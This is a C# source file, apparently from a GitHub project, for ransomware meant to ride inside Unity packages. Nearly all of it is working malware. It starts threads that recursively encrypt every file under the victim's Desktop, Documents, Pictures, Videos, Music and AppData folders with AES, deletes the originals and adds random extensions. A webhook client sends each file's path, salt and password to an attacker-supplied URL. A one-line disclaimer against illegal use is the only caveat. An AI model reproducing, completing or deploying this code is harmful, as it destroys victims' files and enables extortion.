using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace UnityRansomware
{
    //Dont use that for Illegal aktivity!
    //Github: https://github.com/none-development/unitypackage-ransomware
    public static class RansomwareWebhook
    {
        private static string RandomString(int length, bool chinese) //Generate a Unice Password for the File
        {

            Random rand = new Random();
            const string pool = "abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            const string poolchinese = "ㄓㄨㄥㄨㄣ中文字将制造款世界上最先进的飞机这是份非常简单的说明书";
            var builder = new StringBuilder();

            for (var i = 0; i < length; i++)
            {
                if (chinese)
                {
                    var c = poolchinese[rand.Next(0, poolchinese.Length)];
                    builder.Append(c);
                }
                else
                {
                    var c = pool[rand.Next(0, pool.Length)];
                    builder.Append(c);
                }

            }

            return builder.ToString();
        }
        public static string selectExtension() //Call this Methode to get a Random Extension
        {
            return fileextensions.ToList().PickRandom();
        }
        public static string WEBHOOKARRAYSELECT() //Call this Methode to get a Random Extension
        {
            return webhookURLS.ToList().PickRandom();
        }

        // <summary>Random Filename</summary>
        private static string[] fileextensions = { ".unityransomware", ".unityran", ".meiransomware", ".catgirl", ".owo", ".nyaa", ".micro", ".cerber", ".osiris" };
        private static string[] webhookURLS = { 
            "",
            "",
            "" 
        }; //Array for WebhookURLs, if you use a POublic Service to provide Timeout.
        private static T PickRandom<T>(this List<T> enumerable)
        {
            int index = new System.Random().Next(0, enumerable.Count());
            return enumerable[index];

        }

        //<summery>
        // Config Files
        //</summery>

        //-----------------------------------------------------------------------------------------------------------------------------------------------------
        private static string _APPDATA = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private static string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private static string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
        private static string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        private static string MUSIC_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
        private static string VIDEOS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
        //-----------------------------------------------------------------------------------------------------------------------------------------------------


        /// <summary>
        /// Start the Ransomware
        /// </summary>
        /// <param name="a">Set it to True too Encrypt the System</param>

        public static void Startencrypt(bool a)
        {
            if (a)
            {
                StartHandler();
            }
        }
        /// <summary>
        /// Thread Handler to make it Faster
        /// </summary>

        public static void StartHandler()
        {
            Thread BASE_1 = new Thread(DESKTOP);
            Thread BASE_2 = new Thread(DOCUMENTS);
            Thread BASE_3 = new Thread(PICTURES);
            Thread BASE_4 = new Thread(VIDEOS);
            Thread BASE_5 = new Thread(MUSIK);
            Thread BASE_6 = new Thread(APPDATA);

            BASE_1.Start();
            BASE_2.Start();
            BASE_3.Start();
            BASE_4.Start();
            BASE_5.Start();
            BASE_6.Start();

        }

        //Everything on the DESKTOP
        private static void DESKTOP()
        {
            encryptStuff(DESKTOP_FOLDER);
        }

        //Somtiome it work
        private static void DOCUMENTS()
        {
            try
            {
                encryptStuff(DOCUMENTS_FOLDER);
            }
            catch { }
        }

        //Somtiome it work
        private static void PICTURES()
        {
            try
            {
                encryptStuff(PICTURES_FOLDER);
            }
            catch { }
        }
        //Somtiome it work
        private static void VIDEOS()
        {
            try
            {
                encryptStuff(VIDEOS_FOLDER);
            }
            catch { }
        }
        //Somtiome it work
        private static void MUSIK()
        {
            try
            {
                encryptStuff(MUSIC_FOLDER);
            }
            catch { }
        }

        private static void APPDATA()
        {
            try
            {
                encryptStuff(_APPDATA);
            }
            catch { }
        }





        // Cryto Stuff

        private static void encryptStuff(string sDir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {
                    if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
                    {
                        Crypto(f, RandomString(15, false)); //Randomstring make it not tooo high bc ram ;D
                        File.Delete(f);
                    }

                }

                foreach (string d in Directory.GetDirectories(sDir))
                {
                    encryptStuff(d);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }
        private static string ENCRYPTED_FILE_EXTENSION = selectExtension(); //Unity Ransomeware file extension, now in Random.
        private static void Crypto(string inputFile, string password)
        {
            Webhooksupport.webhookurl = WEBHOOKARRAYSELECT();
            byte[] salt = GenerateRandomSalt();
            Webhooksupport.webhookmassage = $"File: {inputFile}\nSalt: {salt}\nPassword for the File: {password}";
            Webhooksupport.CallToSend();
            FileStream fsCrypt = new FileStream(inputFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create);
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CBC;
            fsCrypt.Write(salt, 0, salt.Length);
            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fsIn = new FileStream(inputFile, FileMode.Open);
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {

                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();
            }
            catch 
            {

            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
                File.Delete(inputFile);

            }
        }

        public static byte[] GenerateRandomSalt() //generate salt
        {
            byte[] data = new byte[25]; //Static Salt, to Encrypt file

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {

                    rng.GetBytes(data);
                }
            }

            return data;
        }

    }

    public class Webhooksupport : IDisposable
    {
        private readonly WebClient WebhookClient;
        private static NameValueCollection Values = new NameValueCollection();
        public static string webhookurl { get; set; }
        public static string webhookmassage { get; set; }
        
        public Webhooksupport()
        {
            WebhookClient = new WebClient();
        }
        public static void CallToSend()
        {
            Webhooksupport data = new Webhooksupport();
            data.SendWebhook();
            webhookurl = null;
            webhookmassage = null;
        }

        public void SendWebhook()
        {
            Values.Add("content", webhookmassage);
            WebhookClient.UploadValues(webhookurl, Values);
        }

        public void Dispose()
        {
            WebhookClient.Dispose();
        }
    }

}
